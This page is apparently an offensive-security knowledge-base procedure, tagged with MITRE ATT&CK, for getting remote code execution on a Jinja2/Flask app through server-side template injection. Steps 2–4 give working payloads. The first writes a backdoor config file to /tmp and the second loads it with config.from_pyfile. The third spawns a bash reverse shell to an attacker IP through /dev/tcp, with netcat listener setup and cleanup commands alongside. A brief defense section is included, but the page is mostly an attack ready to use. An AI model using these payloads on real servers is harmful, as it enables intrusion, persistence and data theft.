---
id: bc172beb-5b7f-444c-abf7-100525fcd937
name: Jinja2-RCE-via-SSTI-in-Evil-Config-File
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:39.880616+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/Exploit the SSTI by writing an evil config file.]]'
  - '[[tags/Jinja2]]'
  - '[[tags/Jinja2 - Remote Code Execution]]'
  - '[[tags/Server Side Template Injection]]'
commands: []
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# Jinja2-RCE-via-SSTI-in-Evil-Config-File

## Summary

This procedure exploits a Server-Side Template Injection (SSTI) vulnerability in a Jinja2-templated Python application, such as a Flask web app, by injecting a malicious payload that writes an evil configuration file. The payload leverages Jinja2's rendering to access restricted Python objects, create a backdoor config that enables command execution, load it into the application's config, and finally spawn a reverse shell for remote code execution (RCE) on the server.

## Description

Jinja2 is a widely used templating engine in Python web frameworks like Flask. If user-controlled input is passed to Jinja2 without proper sandboxing or escaping, attackers can inject SSTI payloads to access dangerous Python classes and methods, leading to RCE. This technique involves crafting a payload that uses the file object subclass to write a malicious config file to /tmp, loads it via the app's config system (assuming Flask-like config.from_pyfile), and executes a reverse shell command using subprocess. The attack assumes the target is a web application where config values or templates are user-influenced, such as in a dynamic config upload or admin panel. Success grants shell access in the context of the web server process, enabling persistence, data exfiltration, or lateral movement.

## Requirements

1. Valid session or access to a input field vulnerable to SSTI in a Jinja2-rendered template (e.g., via a web form for config settings).
2. Knowledge of the application's config loading mechanism (e.g., uses config.from_pyfile).
3. Python environment on the target server with Jinja2 and subprocess module available.
4. Attacker-controlled listener (e.g., netcat) on a reachable IP and port from the target.
5. Network connectivity from target to attacker (outbound TCP allowed).

## Defense

- Enable Jinja2 sandboxing and restrict access to dangerous globals like __class__ and __subclasses__.
- Validate and escape all user inputs before passing to templates; use autoescaping where possible.
- Regularly audit and patch dependencies (e.g., update Flask/Jinja2) and implement web application firewalls (WAF) to detect SSTI patterns.
- Monitor for anomalous file writes in /tmp, unusual subprocess calls, and outbound connections from web servers.
- Use principle of least privilege for web server processes to limit RCE impact.

## Objectives

1. Inject SSTI payload to write and load an evil config file for command execution.
2. Achieve RCE by spawning a reverse shell on the target server.
3. Establish persistence or perform post-exploitation activities via the shell.

## Instructions

### Step 1: Identify and Confirm SSTI Vulnerability

**Context**: Test the input field (e.g., a config value in a web form) for SSTI by injecting a benign payload like {{7*7}} to confirm template rendering and potential for code execution. This verifies the injection point before deploying the full payload.

Intercept the request using a proxy like Burp Suite and submit the test payload. If the response reflects '49', SSTI is confirmed.

**Expected Output**: Response body contains the computed value (e.g., 49) instead of literal text.

### Step 2: Craft and Inject Evil Config Payload

**Context**: Use the SSTI to access Python's file object via class introspection, write the evil config to /tmp/evilconfig.cfg, which imports and exposes subprocess.check_output as RUNCMD for later use.

**Code** ([[codes/Jinja2-SSTI-Evil-Config-RCE-Payload]]):

Embed the first part of the payload in the vulnerable input:

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
```

Submit the request. This writes the backdoor config file.

**Expected Output**: No visible error in response; file /tmp/evilconfig.cfg created on server (verifiable post-shell).

### Step 3: Load the Evil Config

**Context**: Trigger the application's config loading mechanism to import the evil file, making RUNCMD available in the config object.

Assuming the app has a reload config endpoint or the template context includes config, inject:

```python
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
```

Submit to load the config.

**Expected Output**: Config loads without errors; RUNCMD now accessible via config['RUNCMD'].

### Step 4: Execute Reverse Shell

**Context**: Use the loaded RUNCMD to execute a bash reverse shell connecting back to the attacker.

Inject the final payload:

```python
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/$_ATTACKER_IP/$_ATTACKER_PORT 0>&1"',shell=True) }}
```

Replace $_ATTACKER_IP and $_ATTACKER_PORT with your listener details (e.g., 192.168.1.100/4444). Start a listener like `nc -lvnp 4444` beforehand.

**Expected Output**: Incoming shell connection on attacker listener; interactive bash prompt from target.

### Step 5: Verify and Stabilize Shell

**Context**: Once shelled, confirm access and clean up if needed.

In the shell: `whoami`, `id`, `ls /tmp/` to verify evilconfig.cfg exists. Optionally remove it: `rm /tmp/evilconfig.cfg`.

**Expected Output**: Server process user (e.g., www-data), file presence confirmed.
